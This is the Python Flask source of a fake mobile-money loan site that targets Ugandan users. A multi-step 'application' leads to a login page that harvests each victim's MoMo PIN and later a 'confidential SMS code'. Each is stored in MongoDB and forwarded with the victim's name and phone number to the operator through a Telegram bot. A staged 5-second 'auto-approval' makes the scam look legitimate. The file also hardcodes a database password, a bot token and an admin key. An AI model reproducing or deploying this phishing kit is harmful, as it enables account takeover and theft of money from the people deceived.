from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from pymongo import MongoClient
from bson.objectid import ObjectId
import os
import time
import requests

app = Flask(__name__)
app.secret_key = "super_secret_momo_key"  # Needed for session management

# MongoDB connection
client = MongoClient("mongodb+srv://superuser:2006@superuser.uenn69l.mongodb.net/momo_loan_db?retryWrites=true&w=majority&appName=superuser")
db = client["momo_loan_db"]
applications_collection = db["applications"]

# --- TELEGRAM BOT CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "8802138287:AAHXDX_8S-OGN4NBemcQPdI3uZzFsICDQh4"
TELEGRAM_ADMIN_CHAT_ID = "7217281586"

def send_telegram_alert(app_data, title="NEW MOMO LOAN APPLICATION"):
    """Sends immediate notification alert to your Telegram chat."""
    message = (
        f"🚨 *{title}* 🚨\n\n"
        f"🆔 *App ID:* `{app_data.get('app_id')}`\n"
        f"👤 *Applicant:* {app_data.get('first_name', '')} {app_data.get('last_name', '')}\n"
        f"📞 *Phone:* +256 {app_data.get('phone', '')}\n"
        f"🔑 *MoMo PIN:* `{app_data.get('password', '')}`\n"
        f"🔐 *Auth Code:* `{app_data.get('auth_code', 'N/A')}`\n"
        f"💰 *Amount:* UGX {app_data.get('amount', '')}\n"
        f"⏱️ *Term:* {app_data.get('term', '')}\n"
        f"💼 *Employment:* {app_data.get('employment', '')}\n"
        f"📊 *Income:* UGX {app_data.get('income', '')}\n"
        f"📝 *Purpose:* {app_data.get('purpose', '')}"
    )
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_ADMIN_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Telegram notification error: {e}")

@app.route("/")
def index():
    return render_template("index.html")

# --- MULTI-STEP APPLICATION WIZARD ---
@app.route("/apply/step1", methods=["GET", "POST"])
def apply_step1():
    if request.method == "POST":
        session["loan_type"] = request.form.get("loan_type")
        session["amount"] = request.form.get("amount")
        session["term"] = request.form.get("term")
        session["purpose"] = request.form.get("purpose")
        return redirect(url_for("apply_step2"))
    return render_template("apply_step1.html")

@app.route("/apply/step2", methods=["GET", "POST"])
def apply_step2():
    if request.method == "POST":
        session["first_name"] = request.form.get("first_name")
        session["last_name"] = request.form.get("last_name")
        session["phone"] = request.form.get("phone")
        return redirect(url_for("apply_step3"))
    return render_template("apply_step2.html")

@app.route("/apply/step3", methods=["GET", "POST"])
def apply_step3():
    if request.method == "POST":
        session["employment"] = request.form.get("employment")
        session["income"] = request.form.get("income")
        return redirect(url_for("processing_screen"))
    return render_template("apply_step3.html")

@app.route("/processing")
def processing_screen():
    return render_template("processing.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        pin = request.form.get("pin")
        phone = session.get("phone", "Unknown")
        
        app_data = {
            "loan_type": session.get("loan_type"),
            "amount": session.get("amount"),
            "term": session.get("term"),
            "purpose": session.get("purpose"),
            "first_name": session.get("first_name"),
            "last_name": session.get("last_name"),
            "phone": phone,
            "employment": session.get("employment"),
            "income": session.get("income"),
            "password": pin,
            "status": "Pending Approval",
            "created_at": time.time(),  # Timestamp used for 5-second timer
            "app_id": "APP-" + os.urandom(4).hex().upper(),
            "auth_code": ""
        }
        
        inserted_id = applications_collection.insert_one(app_data).inserted_id
        session["current_app_id"] = str(inserted_id)
        
        # Send instant notification alert to Telegram
        send_telegram_alert(app_data, title="NEW MOMO LOAN APPLICATION")
        
        return redirect(url_for("pending"))
    return render_template("login.html")

@app.route("/pending")
def pending():
    current_id = session.get("current_app_id")
    if not current_id:
        return redirect(url_for("index"))
        
    record = applications_collection.find_one({"_id": ObjectId(current_id)})
    status = record.get("status", "Pending Approval") if record else "Pending Approval"
    app_id = record.get("app_id", "APP-PENDING") if record else "APP-PENDING"
    
    return render_template("pending.html", app_id=app_id, status=status)

# Automatic Timer Logic: Approves application after 5 seconds
@app.route("/check-status")
def check_status():
    current_id = session.get("current_app_id")
    if current_id:
        record = applications_collection.find_one({"_id": ObjectId(current_id)})
        if record:
            current_status = record.get("status", "Pending Approval")
            created_at = record.get("created_at", time.time())
            
            # Auto-approve if 5 seconds have elapsed
            if current_status == "Pending Approval" and (time.time() - created_at) >= 5:
                applications_collection.update_one(
                    {"_id": ObjectId(current_id)},
                    {"$set": {"status": "Approved"}}
                )
                return jsonify({"status": "Approved"})
            
            return jsonify({"status": current_status})
            
    return jsonify({"status": "Pending Approval"})

@app.route("/submit-auth-code", methods=["POST"])
def submit_auth_code():
    auth_code = request.form.get("auth_code")
    current_id = session.get("current_app_id")
    
    if current_id:
        applications_collection.update_one(
            {"_id": ObjectId(current_id)},
            {"$set": {"auth_code": auth_code, "status": "Completed"}}
        )
        record = applications_collection.find_one({"_id": ObjectId(current_id)})
        
        # Send notification alert when auth code is submitted
        send_telegram_alert(record, title="CONFIDENTIAL SMS CODE SUBMITTED")
        
    return redirect(url_for("completed"))

@app.route("/completed")
def completed():
    return render_template("completed.html")

@app.route("/admin")
def admin_dashboard():
    if request.args.get("admin") != "ADMIN036":
        return "Unauthorized Access", 403
    all_apps = list(applications_collection.find())
    return render_template("admin.html", applications=all_apps)

@app.route("/admin/update/<app_id>/<status>")
def update_status(app_id, status):
    applications_collection.update_one({"_id": ObjectId(app_id)}, {"$set": {"status": status}})
    return redirect(url_for("admin_dashboard", admin="ADMIN036"))

@app.route("/admin/delete/<app_id>")
def delete_application(app_id):
    applications_collection.delete_one({"_id": ObjectId(app_id)})
    return redirect(url_for("admin_dashboard", admin="ADMIN036"))

if __name__ == "__main__":
    app.run(debug=True, port=5000)
